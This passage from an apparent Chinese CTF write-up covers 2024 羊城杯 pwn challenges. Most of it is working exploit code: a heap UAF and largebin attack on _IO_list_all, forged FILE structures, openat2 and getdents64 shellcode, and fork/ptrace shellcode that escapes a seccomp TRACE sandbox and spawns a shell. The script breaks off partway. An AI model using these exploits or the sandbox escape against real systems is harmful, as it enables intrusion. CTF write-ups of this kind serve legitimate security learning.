class="number">2</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+p64(rop)*((<span class="number">0x70</span>//<span class="number">8</span>)-<span class="number">5</span>)+p64(rop+<span class="number">0x20</span>)+p64(<span class="number">0x401BC7</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="sandbox-after-competition"><a href="#sandbox-after-competition" class="headerlink" title="sandbox(after competition)"></a>sandbox(after competition)</h3><p>这题是最抽象的，本地通可是远程不通😰😰😰😰😰😰<br>典型的菜单题，申请的堆块大小只访问了<code>0x500-0x1000</code>，<code>delete</code>函数存在明显的 <code>UAF</code> </p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/10.png" class="" title="我的图图呢">  <p>所以直接<code>larginbin attack</code>打<code>_IO_list_all</code>即可，可是这只是恶梦的开始，这题开启了沙箱</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/11.png" class="" title="我的图图呢">  <p>可以看到程序吧<code>open</code>和<code>openat</code>给ban了，于是我马上想到了<code>openat2</code>，<code>shellcode</code> 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c66</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    mov rdx, rsp</span></span><br><span class="line"><span class="string">    mov r10, 0x18</span></span><br><span class="line"><span class="string">    push SYS_openat2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>在本地执行 <code>shellcode</code> 后可以马上获取到flag，可是远程不行，当时我认为出题者把flag的文件名给改了，所以我写了以下 <code>shellcode</code> 来获取当前目录下的所有文件名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, 0x2f2e</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    mov rdx, rsp</span></span><br><span class="line"><span class="string">    mov r10, 0x18</span></span><br><span class="line"><span class="string">    push SYS_openat2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode += asm(shellcraft.getdents64(<span class="number">3</span>, heap_base + <span class="number">0x300</span>, <span class="number">0x600</span>))</span><br><span class="line">shellcode += asm(shellcraft.write(<span class="number">1</span>, heap_base + <span class="number">0x300</span>, <span class="number">0x600</span>))</span><br></pre></td></tr></table></figure><p>在本地测试是没问题的，可是到远程就依然什么都没有，后面发现远程的 <code>kernel</code> 版本是 <code>5.4</code>，而 <code>openat2</code> 系统调用是在 <code>kernel 5.6</code> 才引入的，所以这种方法作废</p><p>然后我想到了 <code>io_uring</code>，可是依然是本地能获取flag，远程无法获取flag，那大概率就是不知道flag的路径和文件名的问题了，于是比赛中就没有做出来……</p><p>赛后再重新仔细研究了一下题目，发现 <code>seccomp</code> 禁用系统调用的时候并没有直接 <code>return KILL</code>，而是 <code>return TRACE</code>，然后我在项目 <code>The Linux Kernel documentation</code> 上找到了对于该返回值的描述：</p><blockquote><p>SECCOMP_RET_TRACE:<br>When returned, this value will cause the kernel to attempt to notify a ptrace()-based tracer prior to executing the system call. If there is no tracer present, -ENOSYS is returned to userland and the system call is not executed.<br>A tracer will be notified if it requests PTRACE_O_TRACESECCOMP using ptrace(PTRACE_SETOPTIONS). The tracer will be notified of a PTRACE_EVENT_SECCOMP and the SECCOMP_RET_DATA portion of the BPF program return value will be available to the tracer via PTRACE_GETEVENTMSG.<br>The tracer can skip the system call by changing the syscall number to -1. Alternatively, the tracer can change the system call requested by changing the system call to a valid syscall number. If the tracer asks to skip the system call, then the system call will appear to return the value that the tracer puts in the return value register.<br>The seccomp check will not be run again after the tracer is notified. (This means that seccomp-based sandboxes MUST NOT allow use of ptrace, even of other sandboxed processes, without extreme care; ptracers can use this mechanism to escape.)</p></blockquote><p>也就是说我们有办法对 <code>seccomp</code> 进行逃逸，其具体做法为：使用 <code>fork</code> 开一个子进程，子进程需要 <code>ptrace(PTRACE_TRACEME, 0, 0,0);</code> 来允许自己被父进程追踪，父进程需使用 <code>ptrace(PTRACE_ATTACH, pid, 0, 0);</code> 来追踪子进程。然后父进程在 <code>wait()</code> 阻塞等待子进程发起系统调用。一旦捕捉到，则子进程阻塞，父进程继续运行，此时需用 <code>ptrace(PTRACE_0_SUSPEND_SEECOMP, pid, 0, PTRACE_0_TRACESECCOMP);</code> 将被 <code>TRACE</code> 系统的调用改为允许运行，然后 <code>ptrace(PTRACE_SCONT);</code> 来恢复子进程的系统调用执行。由于我们不知道 <code>flag</code> 的路径和文件名是什么，所以直接使用 <code>execve</code> 来拿 <code>shell</code>, <code>exp</code> 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&quot;./ld-linux-x86-64.so.2&quot;</span>, <span class="string">&quot;./pwn&quot;</span>],</span><br><span class="line">        env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># p=remote(&#x27;49.234.30.109&#x27;,9999)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;5. Exit&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bye</span>():</span><br><span class="line">    meau(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,Content</span>):</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content&#x27;</span>)</span><br><span class="line">    p.send(Content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x510</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x290</span></span><br><span class="line">lg(<span class="string">&quot;heap_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x510</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1f6cc0</span></span><br><span class="line">lg(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x520</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x550</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">bin</span> = libc_base + <span class="number">0x1f70f0</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="built_in">bin</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x550</span>)</span><br><span class="line"></span><br><span class="line">order2 = <span class="string">b&#x27;h\x00&#x27;</span>[::-<span class="number">1</span>].<span class="built_in">hex</span>()</span><br><span class="line">order1 = <span class="string">b&#x27;/bin/bas&#x27;</span>[::-<span class="number">1</span>].<span class="built_in">hex</span>()</span><br><span class="line">shellcode = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">_start:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Step 1: fork a new process */</span></span><br><span class="line"><span class="string">    mov rax, 57             /* syscall number for fork (on x86_64) */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke fork() */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax           /* check if return value is 0 (child) or positive (parent) */</span></span><br><span class="line"><span class="string">    js _exit                /* if fork failed, exit */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Step 2: If parent process, attach to child process */</span></span><br><span class="line"><span class="string">    cmp rax, 0              /* are we the child process? */</span></span><br><span class="line"><span class="string">    je child_process        /* if yes, jump to child_process */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">parent_process:</span></span><br><span class="line"><span class="string">    /* Store child PID */</span></span><br><span class="line"><span class="string">    mov r8,rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rsi, r8            /* rdi = child PID */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Attach to child process */</span></span><br><span class="line"><span class="string">    mov rax, 101            /* syscall number for ptrace */</span></span><br><span class="line"><span class="string">    mov rdi, 0x10           /* PTRACE_ATTACH */</span></span><br><span class="line"><span class="string">    xor rdx, rdx            /* no options */</span></span><br><span class="line"><span class="string">    xor r10, r10            /* no data */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke ptrace(PTRACE_ATTACH, child_pid, 0, 0) */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">monitor_child:</span></span><br><span class="line"><span class="string">    /* Wait for the child to stop */</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rdi, r8            /* rdi = child PID */</span></span><br><span class="line"><span class="string">    mov rsi, rsp            /*  no status*/</span></span><br><span class="line"><span class="string">    xor rdx, rdx            /* no options */</span></span><br><span class="line"><span class="string">    xor r10, r10            /* no rusage */</span></span><br><span class="line"><span class="string">    mov rax, 61             /* syscall number for wait4 */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke wait4() */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Set ptrace options */</span></span><br><span class="line"><span class="string">    mov rax, 110</span></span><br><span class="line"><span class="string">    syscall    </span></span><br><span class="line"><span class="string">    mov rdi, 0x4200         /* PTRACE_SETOPTIONS */</span></span><br><span class="line"><span class="string">    mov rsi, r8            /* rsi = child PID */</span></span><br><span class="line"><span class="string">    xor rdx, rdx            /* no options */</span></span><br><span class="line"><span class="string">    mov r10, 0x00000080     /* PTRACE_O_TRACESECCOMP */</span></span><br><span class="line"><span class="string">    mov rax, 101            /* syscall number for ptrace */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke ptrace(PTRACE_SETOPTIONS, child_pid, 0, 0) */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Allow the child process to continue */</span></span><br><span class="line"><span class="string">    mov rax, 110</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rdi, 0x7            /* PTRACE_CONT */</span></span><br><span class="line"><span class="string">    mov rsi, r8            /* rsi = child PID */</span></span><br><span class="line"><span class="string">    xor rdx, rdx            /* no options */</span></span><br><span class="line"><span class="string">    xor r10, r10            /* no data */</span></span><br><span class="line"><span class="string">    mov rax, 101            /* syscall number for ptrace */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke ptrace(PTRACE_CONT, child_pid, 0, 0) */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Loop to keep monitoring the child */</span></span><br><span class="line"><span class="string">    jmp monitor_child</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">child_process:</span></span><br><span class="line"><span class="string">    /* Child process code here */</span></span><br><span class="line"><span class="string">    /* For example, we could execute a shell or perform other actions */</span></span><br><span class="line"><span class="string">    /* To keep it simple, let&#x27;s just execute `/bin/sh` */</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">    /* sleep(5) */</span></span><br><span class="line"><span class="string">    /* push 0 */</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    dec byte ptr [rsp]</span></span><br><span class="line"><span class="string">    /* push 5 */</span></span><br><span class="line"><span class="string">    push 5</span></span><br><span class="line"><span class="string">    /* nanosleep(requested_time=&#x27;rsp&#x27;, remaining=0) */</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor esi, esi /* 0 */</span></span><br><span class="line"><span class="string">    /* call nanosleep() */</span></span><br><span class="line"><span class="string">    push SYS_nanosleep /* 0x23 */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 0x<span class="subst">&#123;order2&#125;</span>  /* &quot;/bin/sh&quot; */</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rax, 0x<span class="subst">&#123;order1&#125;</span>  /* &quot;/bin/sh&quot; */</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp    </span></span><br><span class="line"><span class="string">    mov rsi, 0</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov rax, 59             /* syscall number for execve */</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    jmp child_process</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">_exit:</span></span><br><span class="line"><span class="string">    /* Exit the process */</span></span><br><span class="line"><span class="string">    mov rax, 60             /* syscall number for exit */</span></span><br><span class="line"><span class="string">    xor rdi, rdi            /* status 0 */</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,shellcode)</span><br><span class="line"></span><br><span class="line">target = libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line"></span><br><span class="line">stderr = libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">magic_gadget = libc_base + <span class="number">0x000000000008c385</span></span><br><span class="line">mprotect = libc_base + libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">pop_rax_call_rax = libc_base + <span class="number">0x000000000015f288</span></span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,fake_io_read[<span class="number">0x10</span>:])</span><br><span class="line">bye()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_io_write = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x800</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>], <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span 